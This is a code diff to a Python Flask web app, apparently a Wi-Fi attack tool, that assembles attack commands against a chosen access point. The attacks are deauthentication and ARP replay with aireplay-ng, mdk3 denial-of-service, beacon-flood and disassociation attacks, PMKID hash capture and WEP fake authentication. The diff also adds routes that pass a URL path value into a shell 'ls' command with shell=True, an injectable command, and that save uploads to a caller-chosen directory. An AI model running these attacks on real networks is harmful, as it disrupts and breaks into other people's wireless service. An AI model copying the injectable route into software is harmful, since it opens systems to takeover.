@@ -26,6 +26,7 @@ def setNetcardMon():
     netcardMon = netcard + "mon"
     session["netcardMon"] = netcardMon
     mac = f"{config['mac']['oui']}:12:8c:b6"
+    session["mac"] = mac
 
     startMon = f'airmon-ng check kill && airmon-ng start {netcard}'
     subprocess.run(startMon, check=True, shell=True)
@@ -79,36 +80,43 @@ def attack(id):
     startScan = f'airodump-ng -w /tmp/WiFiGhost/dumpDataAttack --output-format csv {netcardMon} -e {essid} --channel {channel}'
 
     match id:
+        #WPA/WPA2 With Clients
         case 0: #Deauthentication
-            attack = f'aireplay-ng -b {bssid} -0 {nPackets} {netcardMon}'
+            attack = f'aireplay-ng -0 {nPackets} -b {bssid} {netcardMon}'
             pass
-        case 1: #Fakeauthentication
-            attack = f'aireplay-ng -b {bssid} -1 {nPackets} {netcardMon}'
+        case 1: #Fake DoS Attack
+            attack = f'mdk3 {netcardMon} a -a {bssid}'
             pass
-        case 2: #Interactive packet replay
-            attack = f'aireplay-ng -b {bssid} -2 {nPackets} {netcardMon}'
+        case 2: #Beacon Flood Mode Attack
+            fakeNets = escape(request.form['fn'])
+            attack = f'mdk3 {netcardMon} b -f {fakeNets} -a -s 1000 -c {channel}'
             pass
-        case 3: #ARP request replay attack
-            attack = f'aireplay-ng -b {bssid} -3 {nPackets} {netcardMon}'
+        case 3: #Disassociation Amok Mode Attack
+            attack = f'mdk3 {netcardMon} d -w blacklist -c 1'
             pass
-        case 4: #KoreK chopchop attack
-            attack = f'aireplay-ng -b {bssid} -4 {nPackets} {netcardMon}'
+        case 4: #Michael Shutdown Explotation
+            attack = f'mdk3 {netcardMon} m -t {bssid}'
             pass
-        case 5: #Fragmentation attack
-            attack = f'aireplay-ng -b {bssid} -5 {nPackets} {netcardMon}'
+
+        #WPA/WPA2 Without Clients
+        case 5: #PMKID
+            attack = f'hcxdumptool -i {netcardMon} -o captura --enable_status=1'
+            extract = f'hcxpcaptool -z hashes captura'
             pass
-        case 6: #Cafe-latte attack
-            attack = f'aireplay-ng -b {bssid} -6 {nPackets} {netcardMon}'
+
+        #WPS
+        case 6: #TODO
+            attack = f''
             pass
-        case 7: #Client-oriented fragmentation attack
-            attack = f'aireplay-ng -b {bssid} -7 {nPackets} {netcardMon}'
+
+        #WEP
+        case 7: #Fake Authentication Attack
+            attack = f'aireplay-ng -1 0 -a {bssid} -h {session["mac"]} {netcardMon} && aireplay-ng -2 -p 0841 -b {bssid} -h {session["mac"]} {netcardMon}'
             pass
-        case 8: #WPA Migration Mode
-            attack = f'aireplay-ng -b {bssid} -8 {nPackets} {netcardMon}'
+        case 8: #ARP Replay Attack
+            attack = f'aireplay-ng -b {bssid} -3 -n {nPackets} -x 1000 -h {session["mac"]} {netcardMon}'
             pass
-        case 9: #Injection test
-            attack = f'aireplay-ng -b {bssid} -9 {nPackets} {netcardMon}'
-            pass
+ 
     
     #TODO:ejecutar en un hilo y esperar su finalizacion
     #subprocess.run(attack, check=True, shell=True)
@@ -117,17 +125,16 @@ def attack(id):
     return make_response(200)
 
 
-@app.post('/wordlist')
-def setWordlist():
+@app.post('/list/<string:list>')
+def setWordlist(list):
     f = request.files['file']
-    print(f.filename)
-    f.save(f'wordlist/{secure_filename(f.filename)}')
+    f.save(f'{list}/{secure_filename(f.filename)}')
     
-    return make_response(200)
+    return make_response(f"saved on {list}/{secure_filename(f.filename)}")
 
-@app.get('/wordlist')
-def getWordlists():
-    ls = 'ls wordlist'
+@app.get('/list/<string:list>')
+def getWordlists(list):
+    ls = f'ls {list}'
     output = subprocess.run(ls, check=True, capture_output=True, text=True, shell=True)
     
     ls = output.stdout
